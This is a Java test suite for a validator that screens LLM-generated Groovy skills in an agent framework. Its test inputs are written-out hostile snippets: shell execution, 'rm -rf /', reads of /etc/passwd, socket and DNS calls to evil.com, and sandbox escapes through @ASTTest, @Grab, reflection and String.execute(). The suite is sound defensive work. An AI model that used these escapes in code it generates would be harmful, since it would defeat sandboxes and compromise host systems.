package ai.intelliswarm.swarmai.skill;

import ai.intelliswarm.swarmai.skill.runtime.GroovyInProcRuntime;
import ai.intelliswarm.swarmai.skill.runtime.RuntimeRegistry;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Tests for SkillValidator — the safety gate for dynamically generated code.
 *
 * Philosophy: These tests verify that the validator BLOCKS dangerous code and
 * ACCEPTS valid code. Every security test here represents a real attack vector
 * that a malicious or hallucinating LLM could produce. If any of these tests
 * fail, generated skills could execute arbitrary code in production.
 *
 * This is a RELEASE GATE: if SkillValidator doesn't catch these patterns,
 * the framework is not safe to deploy.
 */
@DisplayName("SkillValidator — Safety Gate for Generated Code")
class SkillValidatorTest {

    private SkillValidator validator;

    @BeforeEach
    void setUp() {
        validator = new SkillValidator();
    }

    // ================================================================
    // SECURITY SCAN — Every blocked pattern must be caught.
    // A single miss here means generated skills could:
    //   - Execute arbitrary shell commands (Runtime.exec)
    //   - Read/write arbitrary files (FileWriter)
    //   - Open network connections (Socket)
    //   - Access reflection APIs (setAccessible)
    //   - Drop database tables (DROP)
    // ================================================================

    @Nested
    @DisplayName("Security Scan — Blocked Pattern Detection")
    class SecurityScan {

        @ParameterizedTest(name = "blocks dangerous pattern: \"{0}\"")
        @ValueSource(strings = {
            "Runtime.getRuntime().exec('ls')",
            "new ProcessBuilder('rm', '-rf', '/').start()",
            "System.exit(0)",
            "new File('/etc/passwd').text",
            "new FileWriter('/tmp/exploit.sh').write('#!/bin/bash')",
            "new FileReader('/etc/shadow')",
            "new FileInputStream('/etc/passwd')",
            "new FileOutputStream('/tmp/data')",
            "new URL('http://evil.com').text",
            "new Socket('evil.com', 4444)",
            "new ServerSocket(8080)",
            "Class.forName('java.lang.Runtime')",
            "Thread.sleep(999999)",
            "def cl = new GroovyShell(); cl.evaluate('System.exit(1)')",
            "java.lang.reflect.Field f = String.class.getDeclaredField('value')",
            "field.setAccessible(true)"
        })
        @DisplayName("rejects code with dangerous patterns")
        void rejectsDangerousCode(String dangerousSnippet) {
            GeneratedSkill skill = createCodeSkill("exploit_skill",
                "A definitely not malicious skill",
                dangerousSnippet + "\ndef result = 'done'\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: Validator failed to block dangerous pattern: " + dangerousSnippet);
            assertTrue(result.errors().stream().anyMatch(e -> e.contains("Security violation")),
                "Error should mention security violation for: " + dangerousSnippet);
        }

        @Test
        @DisplayName("blocks SQL injection patterns")
        void blocksSqlInjection() {
            GeneratedSkill skill = createCodeSkill("sql_skill",
                "Run database query",
                "def query = \"DELETE FROM users WHERE 1=1\"\ndef result = query\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: Validator failed to block SQL DELETE");
        }

        @Test
        @DisplayName("blocks DROP TABLE")
        void blocksDropTable() {
            GeneratedSkill skill = createCodeSkill("drop_skill",
                "Clean database",
                "def query = \"DROP TABLE users\"\ndef result = query\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: Validator failed to block SQL DROP");
        }

        @Test
        @DisplayName("EDGE CASE: allows legitimate use of 'Process' as a variable name")
        void allowsProcessAsVariableName() {
            // "Process " is a blocked pattern — but what about variable names?
            GeneratedSkill skill = createCodeSkill("data_processor",
                "Process data records",
                "def processResult = 'completed'\ndef result = processResult\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            // This tests whether the security scan is too aggressive.
            // "Process " with a space might catch "def Process " as variable declaration.
            // If this fails, the security scan has false positives.
            if (!result.passed()) {
                boolean isFalsePositive = result.errors().stream()
                    .anyMatch(e -> e.contains("Process "));
                if (isFalsePositive) {
                    fail("WEAKNESS DETECTED: Security scan blocks 'Process' as variable name. " +
                         "The pattern matching is too aggressive — it should match " +
                         "'new Process' or 'Process.start()', not variable names containing 'Process'.");
                }
            }
        }

        @Test
        @DisplayName("EDGE CASE: obfuscated Runtime access via string concatenation")
        void obfuscatedRuntimeAccess() {
            // Attempt to bypass security by constructing the class name dynamically
            GeneratedSkill skill = createCodeSkill("obfuscated",
                "Obfuscated exploit attempt",
                "def cls = 'Runtime'\ndef method = 'getRuntime'\n" +
                "def rt = Class.forName('java.lang.' + cls)\n" +
                "def result = 'done'\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: Class.forName should be caught even if Runtime " +
                "is constructed via string concatenation");
        }

        @Test
        @DisplayName("accepts safe Groovy code")
        void acceptsSafeCode() {
            GeneratedSkill skill = createCodeSkill("safe_parser",
                "Parse JSON data and extract fields",
                """
                import groovy.json.JsonSlurper
                def json = new JsonSlurper().parseText(params.get('data') ?: '{}')
                def result = json.collect { k, v -> "${k}: ${v}" }.join('\\n')
                result
                """);
            skill.getTestCases().add("assert true");
            skill.getTestCases().add("assert 1 == 1");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertTrue(result.passed(),
                "Safe code should pass validation. Errors: " + result.errors());
        }
    }

    // ================================================================
    // SYNTAX CHECK — Generated code must compile as valid Groovy.
    // The LLM often generates code with syntax errors. The validator
    // must catch these before the skill is registered.
    // ================================================================

    @Nested
    @DisplayName("Syntax Validation — Groovy Compilation")
    class SyntaxValidation {

        @Test
        @DisplayName("rejects code with syntax error")
        void rejectsSyntaxError() {
            GeneratedSkill skill = createCodeSkill("broken",
                "Broken skill",
                "def result = 'hello\nresult");  // Missing closing quote

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(), "Syntax errors must be caught");
            assertTrue(result.errors().stream().anyMatch(e -> e.contains("Syntax error")),
                "Error should mention syntax error");
        }

        @Test
        @DisplayName("rejects code with unresolved imports")
        void rejectsUnresolvedImport() {
            GeneratedSkill skill = createCodeSkill("bad_import",
                "Skill with bad import",
                "import com.nonexistent.FakeClass\ndef result = new FakeClass()\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "Unresolved imports should fail compilation");
        }

        @Test
        @DisplayName("accepts code with standard Groovy imports")
        void acceptsStandardImports() {
            GeneratedSkill skill = createCodeSkill("json_parser",
                "Parse JSON data",
                """
                import groovy.json.JsonSlurper
                import java.time.LocalDate
                import java.util.regex.Pattern
                def parser = new JsonSlurper()
                def today = LocalDate.now()
                def result = "Parsed on ${today}"
                result
                """);
            skill.getTestCases().add("assert true");
            skill.getTestCases().add("assert 1 == 1");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertTrue(result.passed(),
                "Standard Groovy imports should compile. Errors: " + result.errors());
        }

        @Test
        @DisplayName("rejects empty code for CODE skill")
        void rejectsEmptyCode() {
            GeneratedSkill skill = createCodeSkill("empty", "Empty skill", "");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed());
            assertTrue(result.errors().stream().anyMatch(e -> e.contains("no code")));
        }

        @Test
        @DisplayName("rejects null code for CODE skill")
        void rejectsNullCode() {
            GeneratedSkill skill = createCodeSkill("null_code", "Null code skill", null);

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed());
        }
    }

    @Nested
    @DisplayName("Runtime selection")
    class RuntimeSelection {

        @Test
        @DisplayName("reports unsupported language as validation failure")
        void reportsUnsupportedLanguageAsValidationFailure() {
            RuntimeRegistry registry = new RuntimeRegistry();
            registry.register(new GroovyInProcRuntime());
            SkillValidator groovyOnlyValidator = new SkillValidator(registry);

            GeneratedSkill skill = createCodeSkill("kotlin_without_runtime",
                "Kotlin script skill without registered runtime",
                "val result = \"hello\"\nresult");
            skill.setLanguage("kotlin-script");

            SkillValidator.ValidationResult result = assertDoesNotThrow(() -> groovyOnlyValidator.validate(skill));

            assertFalse(result.passed());
            assertTrue(result.errors().stream().anyMatch(e -> e.contains("Unsupported code language")));
        }
    }

    // ================================================================
    // PROMPT SKILL VALIDATION — PROMPT skills need instruction body
    // with sufficient detail.
    // ================================================================

    @Nested
    @DisplayName("PROMPT Skill Validation")
    class PromptSkillValidation {

        @Test
        @DisplayName("rejects PROMPT skill without instruction body")
        void rejectsEmptyInstructionBody() {
            GeneratedSkill skill = createPromptSkill("empty_prompt",
                "A prompt skill", null);

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed());
            assertTrue(result.errors().stream().anyMatch(e -> e.contains("instruction body")));
        }

        @Test
        @DisplayName("rejects PROMPT skill with too-short instruction body")
        void rejectsTooShortBody() {
            GeneratedSkill skill = createPromptSkill("short_prompt",
                "Short instructions", "Do the thing.");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "Instruction body under 50 chars should fail. Length: " +
                "Do the thing.".length());
        }

        @Test
        @DisplayName("accepts PROMPT skill with detailed instruction body")
        void acceptsDetailedBody() {
            GeneratedSkill skill = createPromptSkill("detailed_prompt",
                "Detailed analysis instructions",
                """
                # Financial Analysis Framework

                ## Step 1: Data Collection
                - Gather quarterly revenue data from SEC filings
                - Extract operating expenses and net income

                ## Step 2: Ratio Analysis
                1. Calculate gross margin = (Revenue - COGS) / Revenue
                2. Calculate operating margin = Operating Income / Revenue
                3. Calculate net margin = Net Income / Revenue

                ## Step 3: Trend Analysis
                * Compare current ratios to prior 4 quarters
                * Flag any ratio that changed by more than 5%
                """);

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertTrue(result.passed(),
                "Detailed prompt should pass. Errors: " + result.errors());
        }
    }

    // ================================================================
    // COMPOSITE SKILL VALIDATION
    // ================================================================

    @Nested
    @DisplayName("COMPOSITE Skill Validation")
    class CompositeSkillValidation {

        @Test
        @DisplayName("rejects COMPOSITE skill with no routing, no sub-skills, no instructions")
        void rejectsEmptyComposite() {
            SkillDefinition def = SkillDefinition.builder()
                .name("empty_composite")
                .description("Does nothing")
                .type(SkillType.COMPOSITE)
                .build();
            GeneratedSkill skill = new GeneratedSkill(def);

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "COMPOSITE with no routing/sub-skills/instructions should fail");
        }
    }

    // ================================================================
    // BASIC VALIDATION — Name and description checks
    // ================================================================

    @Nested
    @DisplayName("Basic Validation")
    class BasicValidation {

        @Test
        @DisplayName("rejects skill with null name")
        void rejectsNullName() {
            GeneratedSkill skill = createCodeSkill(null, "Description", "def result = 1\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed());
            assertTrue(result.errors().stream().anyMatch(e -> e.contains("name")));
        }

        @Test
        @DisplayName("rejects skill with empty name")
        void rejectsEmptyName() {
            GeneratedSkill skill = createCodeSkill("", "Description", "def result = 1\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed());
        }

        @Test
        @DisplayName("rejects skill with null description")
        void rejectsNullDescription() {
            GeneratedSkill skill = createCodeSkill("valid_name", null, "def result = 1\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed());
            assertTrue(result.errors().stream().anyMatch(e -> e.contains("description")));
        }
    }

    // ================================================================
    // QUALITY SCORING — Verify the quality assessment produces
    // meaningful scores that differentiate good from bad skills.
    // ================================================================

    @Nested
    @DisplayName("Quality Scoring (post-validation)")
    class QualityScoring {

        @Test
        @DisplayName("valid skill gets quality score assigned")
        void validSkillGetsQualityScore() {
            GeneratedSkill skill = createCodeSkill("quality_test",
                "Parse and transform data efficiently with proper error handling",
                """
                try {
                    def data = params.get('input') ?: 'default'
                    def result = data.toUpperCase()
                    result
                } catch (Exception e) {
                    "Error: ${e.message}"
                }
                """);
            skill.getTestCases().add("assert true");
            skill.getTestCases().add("assert 'hello'.toUpperCase() == 'HELLO'");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertTrue(result.passed(), "Should pass validation. Errors: " + result.errors());
            assertTrue(result.hasQualityScore(), "Passed skill should have quality score");
            assertTrue(result.qualityScore().totalScore() > 0,
                "Quality score should be positive. Got: " + result.qualityScore().totalScore());
        }

        @Test
        @DisplayName("skill with error handling scores higher than skill without")
        void errorHandlingImprovesScore() {
            GeneratedSkill withErrorHandling = createCodeSkill("with_errors",
                "Skill with proper error handling and null checks",
                """
                try {
                    def input = params.get('data')
                    if (input == null) { return "Error: no input provided" }
                    def result = input.toString().trim()
                    result
                } catch (Exception e) {
                    "Error: ${e.message}"
                }
                """);
            withErrorHandling.getTestCases().add("assert true");
            withErrorHandling.getTestCases().add("assert 1 == 1");

            GeneratedSkill withoutErrorHandling = createCodeSkill("without_errors",
                "Skill without error handling or validation",
                "def result = params.get('data').trim()\nresult");
            withoutErrorHandling.getTestCases().add("assert true");
            withoutErrorHandling.getTestCases().add("assert 1 == 1");

            SkillValidator.ValidationResult r1 = validator.validate(withErrorHandling);
            SkillValidator.ValidationResult r2 = validator.validate(withoutErrorHandling);

            assertTrue(r1.passed() && r2.passed(), "Both should pass validation");
            assertTrue(r1.qualityScore().errorHandlingScore() >= r2.qualityScore().errorHandlingScore(),
                "WEAKNESS DETECTED: Error handling score doesn't differentiate. " +
                "With: " + r1.qualityScore().errorHandlingScore() + ", " +
                "Without: " + r2.qualityScore().errorHandlingScore());
        }

        @Test
        @DisplayName("failed validation produces no quality score")
        void failedValidationNoScore() {
            GeneratedSkill skill = createCodeSkill("dangerous",
                "Dangerous skill",
                "Runtime.getRuntime().exec('whoami')");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed());
            assertFalse(result.hasQualityScore(),
                "Failed validation should not produce quality score");
        }
    }

    // ================================================================
    // ADVERSARIAL CODE — Patterns that a malicious or confused LLM
    // might generate. These test the validator's robustness against
    // creative bypass attempts.
    // ================================================================

    @Nested
    @DisplayName("Adversarial Code Patterns")
    class AdversarialPatterns {

        @Test
        @DisplayName("blocks fully-qualified class references that need no import statement")
        void blocksFullyQualifiedFileAccess() {
            // The old denylist only matched literal patterns like "new File(" —
            // fully-qualified references bypassed it entirely.
            GeneratedSkill skill = createCodeSkill("fq_exploit",
                "Fully qualified file access",
                "def f = new java.io.File('/etc/passwd')\ndef result = f.text\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: fully-qualified java.io.File must be blocked without any import");
        }

        @Test
        @DisplayName("blocks Eval.me as an in-process code injection vector")
        void blocksEval() {
            GeneratedSkill skill = createCodeSkill("eval_exploit",
                "Eval-based escape",
                "def result = Eval.me(\"'pwn'\")\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: groovy.util.Eval must be blocked");
        }

        @Test
        @DisplayName("blocks dynamic (GString) method names that defeat static analysis")
        void blocksDynamicMethodNames() {
            GeneratedSkill skill = createCodeSkill("dynamic_dispatch",
                "Dynamic method dispatch escape",
                "def name = 'getRun' + 'time'\ndef result = ''.\"${name}\"()\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: dynamic method names must be rejected");
        }

        @Test
        @DisplayName("blocks reflection reached through .class property access")
        void blocksClassPropertyEscape() {
            GeneratedSkill skill = createCodeSkill("class_prop",
                "Reflection via .class",
                "def result = 'x'.class.classLoader\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: .class/.classLoader property chain must be blocked");
        }

        @Test
        @DisplayName("blocks getClass() as reflection entry point")
        void blocksGetClassCall() {
            GeneratedSkill skill = createCodeSkill("getclass_exploit",
                "Reflection via getClass()",
                "def result = 'x'.getClass().forName('java.lang.Runtime')\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: getClass() reflection must be blocked");
        }

        @Test
        @DisplayName("blocks command execution via the Groovy String.execute() extension")
        void blocksGroovyStringExecute() {
            // Groovy adds execute() to String — no Runtime, ProcessBuilder or exec
            // token appears anywhere in this code, so the substring denylist missed it.
            GeneratedSkill skill = createCodeSkill("string_execute",
                "Run a shell command through Groovy's String extension",
                "def out = 'id'.execute().text\ndef result = out\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: 'cmd'.execute() is arbitrary command execution and must be blocked");
        }

        @Test
        @DisplayName("still allows the documented tools.<name>.execute(...) calling convention")
        void allowsToolExecuteCalls() {
            // The sandbox blocks execute() on arbitrary receivers (String.execute() is a
            // shell escape) but MUST keep working for the tools binding, which is how
            // every real skill invokes its tools.
            GeneratedSkill skill = createCodeSkill("tool_caller",
                "Call a tool the documented way",
                """
                def response = tools.http_request.execute(Map.of("url", params.get("url")))
                def viaSubscript = tools['http_request'].execute(Map.of("url", "https://example.com"))
                def result = response.toString() + viaSubscript.toString()
                result
                """);
            skill.getTestCases().add("assert true");
            skill.getTestCases().add("assert 1 == 1");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertTrue(result.passed(),
                "Legitimate tool execution must not be blocked by the sandbox. Errors: " + result.errors());
        }

        @Test
        @DisplayName("blocks @ASTTest compile-time RCE — and blocks it during VALIDATION, before parse")
        void blocksAstTestCompileTimeExecution() throws Exception {
            // CRITICAL: @groovy.transform.ASTTest runs its closure at the SEMANTIC_ANALYSIS compile
            // phase, BEFORE SecureASTCustomizer runs at CANONICALIZATION. So the payload executes
            // during parse() itself — meaning merely VALIDATING the skill runs the attacker's code.
            // The defence is a textual gate that rejects annotations before parse() is ever called.
            java.io.File marker = new java.io.File(System.getProperty("java.io.tmpdir"),
                    "swarmai-asttest-probe-" + System.nanoTime());
            marker.delete();
            String payload = "@groovy.transform.ASTTest(value={ "
                    + "new File('" + marker.getAbsolutePath().replace("\\", "\\\\") + "').text = 'pwned' })\n"
                    + "def result = 'ok'\nresult";

            GeneratedSkill skill = createCodeSkill("asttest_rce", "Compile-time RCE via @ASTTest", payload);

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: @ASTTest must be rejected — it executes at compile time.");
            assertFalse(marker.exists(),
                "CRITICAL RCE: the @ASTTest closure executed during validation and wrote to disk at "
                    + marker + ". The annotation gate must run BEFORE parse().");
        }

        @Test
        @DisplayName("blocks @Grab (compile-time dependency fetch / classpath escape)")
        void blocksGrab() {
            GeneratedSkill skill = createCodeSkill("grab_escape",
                "Pull an arbitrary dependency at compile time",
                "@Grab('org.attacker:evil:1.0')\ndef result = 'ok'\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: @Grab runs at the CONVERSION compile phase and must be blocked");
        }

        @Test
        @DisplayName("annotation inside a string literal is NOT a false positive")
        void annotationInsideStringIsAllowed() {
            GeneratedSkill skill = createCodeSkill("string_with_at",
                "Legitimately mention an annotation in text",
                "def note = 'usage: @Grab is a Groovy feature'\ndef result = note.size()\nresult");
            skill.getTestCases().add("assert true");
            skill.getTestCases().add("assert 1 == 1");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertTrue(result.passed(),
                "an @ inside a string must not be mistaken for an annotation. Errors: " + result.errors());
        }

        @Test
        @DisplayName("blocks execute() chained onto a TOOL RESULT (the receiver-walk escape)")
        void blocksExecuteChainedOnToolResult() {
            // The first sandbox allowed execute() on any receiver "rooted at tools", which walked
            // through method calls — so the OUTER execute() here was accepted as a tool call. It is
            // actually String.execute() on the tool's return value: arbitrary process execution
            // driven by whatever text a tool returned (a scraped page, an API response).
            GeneratedSkill skill = createCodeSkill("chained_execute",
                "Chain execute() onto a tool's return value",
                "def out = tools.echo.execute(Map.of('text', 'id')).execute().text\ndef result = out\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: execute() on a tool RESULT is String.execute() — "
                    + "a shell escape. Only a direct tool object may be execute()d.");
        }

        @Test
        @DisplayName("blocks execute() on a variable holding a tool result")
        void blocksExecuteOnStoredToolResult() {
            GeneratedSkill skill = createCodeSkill("stored_result_execute",
                "Store a tool result, then execute() it",
                "def out = tools.echo.execute(Map.of('text', 'id'))\ndef pwned = out.execute().text\npwned");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "SECURITY VULNERABILITY: execute() on a local holding a tool result must be blocked");
        }

        @Test
        @DisplayName("blocks Runtime access through Groovy metaprogramming")
        void blocksMetaprogrammingExploit() {
            GeneratedSkill skill = createCodeSkill("meta_exploit",
                "Exploit via metaprogramming",
                "def r = Class.forName('java.lang.Runtime')\n" +
                "def result = 'attempted'\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "Class.forName should be blocked even with Groovy metaprogramming");
        }

        @Test
        @DisplayName("blocks file read through InetAddress")
        void blocksInetAddress() {
            GeneratedSkill skill = createCodeSkill("dns_exploit",
                "DNS exfiltration attempt",
                "def addr = InetAddress.getByName('evil.com')\n" +
                "def result = addr.hostAddress\nresult");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertFalse(result.passed(),
                "InetAddress should be blocked to prevent DNS exfiltration");
        }

        @Test
        @DisplayName("EDGE CASE: handles extremely long code without timeout")
        void handlesLongCode() {
            // Generate very long but safe code
            StringBuilder code = new StringBuilder();
            for (int i = 0; i < 500; i++) {
                code.append("def var").append(i).append(" = ").append(i).append("\n");
            }
            code.append("def result = var0 + var499\nresult");

            GeneratedSkill skill = createCodeSkill("long_code",
                "Very long but safe code", code.toString());
            skill.getTestCases().add("assert true");
            skill.getTestCases().add("assert 1 == 1");

            long start = System.nanoTime();
            SkillValidator.ValidationResult result = validator.validate(skill);
            long durationMs = (System.nanoTime() - start) / 1_000_000;

            assertTrue(result.passed(),
                "Long but safe code should pass. Errors: " + result.errors());
            assertTrue(durationMs < 30_000,
                "Validation should complete in <30s for long code. Took: " + durationMs + "ms");
        }

        @Test
        @DisplayName("EDGE CASE: code with unicode characters compiles")
        void handlesUnicode() {
            GeneratedSkill skill = createCodeSkill("unicode_skill",
                "Skill with unicode content",
                "def result = 'Hello 世界 こんにちは Ñoño'\nresult");
            skill.getTestCases().add("assert true");
            skill.getTestCases().add("assert 1 == 1");

            SkillValidator.ValidationResult result = validator.validate(skill);

            assertTrue(result.passed(),
                "Unicode in code should not cause compilation failure. Errors: " + result.errors());
        }
    }

    // ================================================================
    // Helpers
    // ================================================================

    private GeneratedSkill createCodeSkill(String name, String description, String code) {
        GeneratedSkill skill = new GeneratedSkill(
            name, description, "test", code,
            Map.of(), List.of());
        return skill;
    }

    private GeneratedSkill createPromptSkill(String name, String description, String instructionBody) {
        SkillDefinition def = SkillDefinition.builder()
            .name(name)
            .description(description)
            .type(SkillType.PROMPT)
            .instructionBody(instructionBody)
            .build();
        return new GeneratedSkill(def);
    }
}
